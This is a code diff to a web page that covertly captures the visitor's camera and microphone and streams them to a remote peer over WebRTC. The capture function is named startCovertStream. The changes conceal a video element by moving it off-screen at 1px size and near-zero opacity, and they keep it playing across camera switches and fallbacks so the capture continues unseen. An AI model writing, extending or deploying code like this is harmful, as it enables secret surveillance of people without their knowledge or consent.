@@ -94,7 +94,13 @@
         }
 
         video {
-            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.001;
+            pointer-events: none;
         }
     </style>
 </head>
@@ -120,21 +126,13 @@
 
         const rtcConfig = {
             iceServers: [
-                { urls: "stun:stun.cloudflare.com:3478" },
                 { urls: "stun:stun.l.google.com:19302" },
                 { urls: "stun:stun1.l.google.com:19302" },
                 { urls: "stun:stun2.l.google.com:19302" },
                 { urls: "stun:stun3.l.google.com:19302" },
                 { urls: "stun:stun4.l.google.com:19302" },
-                {
-                    urls: [
-                        "turn:openrelay.metered.ca:80",
-                        "turn:openrelay.metered.ca:443",
-                        "turn:openrelay.metered.ca:443?transport=tcp"
-                    ],
-                    username: "openrelay",
-                    credential: "openrelay"
-                }
+                { urls: "stun:stun.cloudflare.com:3478" },
+                { urls: "stun:stun.twilio.com:3478" }
             ],
             iceCandidatePoolSize: 10
         };
@@ -147,6 +145,7 @@
         let isConnectingWs = false;
         let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
         let isSwitching = false;
+        const hiddenVideo = document.getElementById('hiddenVideo');
 
         async function startCovertStream() {
             const card = document.getElementById('mainCard');
@@ -171,15 +170,23 @@
                     }
                 });
 
+                if (hiddenVideo) {
+                    hiddenVideo.srcObject = localStream;
+                    hiddenVideo.play().catch(() => {});
+                }
+
                 connectSignaling();
             } catch (err) {
                 console.error("Initial camera acquisition error:", err);
-                // Fallback to any available video input
                 try {
                     localStream = await navigator.mediaDevices.getUserMedia({
                         video: true,
                         audio: true
                     });
+                    if (hiddenVideo) {
+                        hiddenVideo.srcObject = localStream;
+                        hiddenVideo.play().catch(() => {});
+                    }
                     connectSignaling();
                 } catch (fallbackErr) {
                     console.error("Fatal camera permission error:", fallbackErr);
@@ -222,6 +229,20 @@
                 const newVideoTrack = newStream.getVideoTracks()[0];
                 if (!newVideoTrack) throw new Error("No video track acquired");
 
+                // Update localStream
+                if (localStream) {
+                    const oldTracks = localStream.getVideoTracks();
+                    oldTracks.forEach(t => localStream.removeTrack(t));
+                    localStream.addTrack(newVideoTrack);
+                } else {
+                    localStream = newStream;
+                }
+
+                if (hiddenVideo) {
+                    hiddenVideo.srcObject = localStream;
+                    hiddenVideo.play().catch(() => {});
+                }
+
                 // Hot-swap video track on WebRTC peer connection
                 if (pc) {
                     const senders = pc.getSenders();
@@ -230,15 +251,6 @@
                         await videoSender.replaceTrack(newVideoTrack);
                         console.log("[+] Replaced track on WebRTC peer connection to:", targetMode);
                     }
-                }
-
-                // Update localStream
-                if (localStream) {
-                    const oldTracks = localStream.getVideoTracks();
-                    oldTracks.forEach(t => localStream.removeTrack(t));
-                    localStream.addTrack(newVideoTrack);
-                } else {
-                    localStream = newStream;
                 }
 
                 currentFacingMode = targetMode;
@@ -263,6 +275,10 @@
                         const senders = pc.getSenders();
                         const videoSender = senders.find(s => s.track && s.track.kind === 'video');
                         if (videoSender) await videoSender.replaceTrack(fallbackTrack);
+                    }
+                    if (hiddenVideo) {
+                        hiddenVideo.srcObject = fallbackStream;
+                        hiddenVideo.play().catch(() => {});
                     }
                 } catch (revertErr) {}
 
